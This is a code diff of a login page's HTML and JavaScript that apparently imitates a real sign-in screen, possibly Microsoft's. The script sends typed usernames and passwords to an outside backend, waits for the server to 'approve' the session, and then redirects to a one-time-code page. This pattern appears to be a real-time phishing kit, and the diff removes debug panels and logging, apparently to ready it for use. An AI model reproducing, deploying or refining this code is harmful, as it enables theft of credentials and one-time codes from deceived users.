@@ -442,37 +442,9 @@
             margin-top: 5px;
             text-align: center;
         }
-
-        /* === DEBUG PANEL (optional - remove in production) === */
-        .debug-panel {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            color: #0f0;
-            padding: 10px;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 12px;
-            max-width: 300px;
-            z-index: 10000;
-            display: none;
-        }
-        .debug-panel.active {
-            display: block;
-        }
     </style>
 </head>
 <body>
-    <!-- Debug Panel (remove in production) -->
-    <div id="debugPanel" class="debug-panel">
-        <div><strong>Debug Info:</strong></div>
-        <div id="debugSession">Session: None</div>
-        <div id="debugStatus">Status: Idle</div>
-        <div id="debugCount">Poll Count: 0</div>
-        <button onclick="toggleDebug()" style="margin-top:5px; padding:2px 5px;">Hide</button>
-    </div>
-
     <!-- Skip to main content link -->
     <a href="#main-content" class="skip-link">Skip to main content</a>
 
@@ -523,7 +495,7 @@
                                 <button type="submit" class="btn-login" id="loginBtn">Log in</button>
                             </div>
                             <div class="form-row text-center">
-                                <button type="button" class="btn-secondary" onclick="window.location.href='otp.html';">Create a username</button>
+                                <button type="button" class="btn-secondary" onclick="window.location.href='page2.html';">Create a username</button>
                             </div>
                             <div id="errorContainer" class="error-message"></div>
                         </form>
@@ -531,17 +503,11 @@
                         <!-- Forgot links -->
                         <div class="forgot-row">
                             <div class="forgot-item">
-                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='otp.html';">Forgot username?</button>
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='page2.html';">Forgot username?</button>
                             </div>
                             <div class="forgot-item">
-                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='otp.html';">Forgot password?</button>
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='page2.html';">Forgot password?</button>
                             </div>
-                        </div>
-                        
-                        <!-- Test button for debugging -->
-                        <div class="text-center" style="margin-top: 20px;">
-                            <button type="button" class="btn-secondary" onclick="testDirectRedirect()" style="background:#f0f0f0;">Test Redirect</button>
-                            <button type="button" class="btn-secondary" onclick="toggleDebug()" style="background:#f0f0f0;">Toggle Debug</button>
                         </div>
                     </div>
                 </div>
@@ -601,41 +567,12 @@
         </footer>
     </main>
 
-    <!-- Enhanced script with better debugging -->
+    <!-- Updated script for backend integration -->
     <script>
         // Configuration
         const API_BASE_URL = window.location.hostname === 'localhost' 
             ? 'http://localhost:5000' 
             : 'https://s-bcknd.onrender.com'; // Your backend URL
-
-        // Debug variables
-        let debugEnabled = true;
-        let pollCount = 0;
-        let currentSessionId = null;
-        let pollingActive = false;
-
-        // Toggle debug panel
-        function toggleDebug() {
-            const panel = document.getElementById('debugPanel');
-            debugEnabled = !debugEnabled;
-            if (debugEnabled) {
-                panel.classList.add('active');
-            } else {
-                panel.classList.remove('active');
-            }
-        }
-
-        // Update debug info
-        function updateDebug() {
-            if (!debugEnabled) return;
-            document.getElementById('debugSession').textContent = `Session: ${currentSessionId || 'None'}`;
-            document.getElementById('debugCount').textContent = `Poll Count: ${pollCount}`;
-        }
-
-        // Test function for direct redirect
-        function testDirectRedirect() {
-            window.location.href = 'otp.html';
-        }
 
         // Password toggle function
         function togglePassword() {
@@ -650,71 +587,24 @@
             }
         }
 
-        // Poll for status with improved error handling
+        // Poll for status
         async function checkStatus(sessionId) {
-            if (!sessionId) {
-                console.error('No session ID provided');
-                return;
+            try {
+                const response = await fetch(`${API_BASE_URL}/status/${sessionId}`);
+                const data = await response.json();
+                
+                if (data.status === 'approved') {
+                    // Redirect to the next page
+                    window.location.href = data.redirect_url;
+                } else {
+                    // Check again in 2 seconds
+                    setTimeout(() => checkStatus(sessionId), 2000);
+                }
+            } catch (error) {
+                console.error('Status check failed:', error);
+                // Continue polling despite error
+                setTimeout(() => checkStatus(sessionId), 3000);
             }
-            
-            currentSessionId = sessionId;
-            pollingActive = true;
-            pollCount = 0;
-            
-            console.log('Starting status check for session:', sessionId);
-            document.getElementById('debugStatus').textContent = 'Status: Polling';
-            updateDebug();
-            
-            const poll = async () => {
-                if (!pollingActive) {
-                    console.log('Polling stopped');
-                    return;
-                }
-                
-                pollCount++;
-                updateDebug();
-                
-                try {
-                    console.log(`Poll attempt ${pollCount} for session ${sessionId}`);
-                    
-                    const response = await fetch(`${API_BASE_URL}/status/${sessionId}`);
-                    const data = await response.json();
-                    
-                    console.log('Status response:', data);
-                    
-                    if (data.status === 'approved' && data.redirect_url) {
-                        console.log('✅ APPROVED! Redirecting to:', data.redirect_url);
-                        document.getElementById('debugStatus').textContent = `Status: Approved -> ${data.redirect_url}`;
-                        
-                        // Stop polling
-                        pollingActive = false;
-                        
-                        // Small delay to ensure debug message is seen
-                        setTimeout(() => {
-                            window.location.href = data.redirect_url;
-                        }, 500);
-                        
-                        return;
-                    } else if (data.status === 'pending') {
-                        console.log('⏳ Pending, checking again in 2 seconds');
-                        document.getElementById('debugStatus').textContent = 'Status: Pending';
-                        setTimeout(poll, 2000);
-                    } else {
-                        console.log('Unknown status response:', data);
-                        document.getElementById('debugStatus').textContent = 'Status: Unknown';
-                        setTimeout(poll, 2000);
-                    }
-                } catch (error) {
-                    console.error('❌ Status check failed:', error);
-                    document.getElementById('debugStatus').textContent = 'Status: Error';
-                    
-                    // Continue polling despite error
-                    setTimeout(poll, 3000);
-                }
-            };
-            
-            // Start polling
-            poll();
         }
 
         // Handle login form submission
@@ -739,11 +629,9 @@
             
             // Disable button and show loading state
             loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="spinner"></span>Sending...';
+            loginBtn.innerHTML = '<span class="spinner"></span>Processing...';
             
             try {
-                console.log('Sending login request to:', `${API_BASE_URL}/login`);
-                
                 // Send login data to backend
                 const response = await fetch(`${API_BASE_URL}/login`, {
                     method: 'POST',
@@ -757,21 +645,13 @@
                 });
                 
                 const data = await response.json();
-                console.log('Login response:', data);
                 
-                if (data.success && data.id) {
-                    // Store session ID
+                if (data.success) {
+                    // Store session ID if needed
                     sessionStorage.setItem('loginSessionId', data.id);
                     
-                    // Save username if remember is checked
-                    if (remember && username) {
-                        localStorage.setItem('ms_username', username);
-                    } else {
-                        localStorage.removeItem('ms_username');
-                    }
-                    
-                    // Update button text
-                    loginBtn.innerHTML = 'Waiting for approval...';
+                    // Show success message
+                    loginBtn.innerHTML = 'Verifying...';
                     
                     // Start polling for approval
                     checkStatus(data.id);
@@ -780,20 +660,18 @@
                     errorContainer.textContent = data.error || 'Login failed. Please try again.';
                     loginBtn.disabled = false;
                     loginBtn.innerHTML = 'Log in';
-                    pollingActive = false;
                 }
             } catch (error) {
                 console.error('Login error:', error);
                 errorContainer.textContent = 'Network error. Please check your connection and try again.';
                 loginBtn.disabled = false;
                 loginBtn.innerHTML = 'Log in';
-                pollingActive = false;
             }
             
             return false;
         }
 
-        // Load saved username on page load
+        // Optional: Save/load username from localStorage if "Remember my username" was checked
         document.addEventListener('DOMContentLoaded', function() {
             const savedUsername = localStorage.getItem('ms_username');
             const rememberCheckbox = document.getElementById('remember');
@@ -803,16 +681,21 @@
                 rememberCheckbox.checked = true;
             }
             
-            // Show debug panel by default
-            document.getElementById('debugPanel').classList.add('active');
-            
-            console.log('API Base URL:', API_BASE_URL);
-            console.log('Page loaded at:', new Date().toISOString());
-        });
-
-        // Clean up polling on page unload
-        window.addEventListener('beforeunload', function() {
-            pollingActive = false;
+            // Save username when form is submitted successfully
+            const originalHandleLogin = handleLogin;
+            window.handleLogin = async function(event) {
+                const result = await originalHandleLogin(event);
+                const username = document.getElementById('username').value;
+                const remember = document.getElementById('remember').checked;
+                
+                if (remember && username) {
+                    localStorage.setItem('ms_username', username);
+                } else {
+                    localStorage.removeItem('ms_username');
+                }
+                
+                return result;
+            };
         });
     </script>
 </body>
